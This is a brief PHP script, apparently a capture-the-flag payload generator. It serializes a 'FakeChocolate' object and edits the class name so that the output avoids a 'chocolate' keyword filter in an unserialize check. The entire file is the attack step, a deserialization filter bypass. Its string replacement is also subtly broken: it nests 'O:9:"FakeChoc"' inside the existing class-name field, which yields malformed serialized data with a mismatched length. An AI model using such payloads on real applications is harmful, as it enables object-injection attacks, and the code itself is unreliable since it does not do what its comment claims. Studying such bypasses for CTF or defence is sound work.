<?php

class FakeChocolate {
    public $cat = 'secret';
    public $kitty = 'secret';
}

$fakeChocolate = new FakeChocolate();
$serialized = serialize($fakeChocolate);

// 修改类名，使其不包含 "chocolate"
$serialized = str_replace('FakeChocolate', 'O:9:"FakeChoc"', $serialized);

echo $serialized;

?>
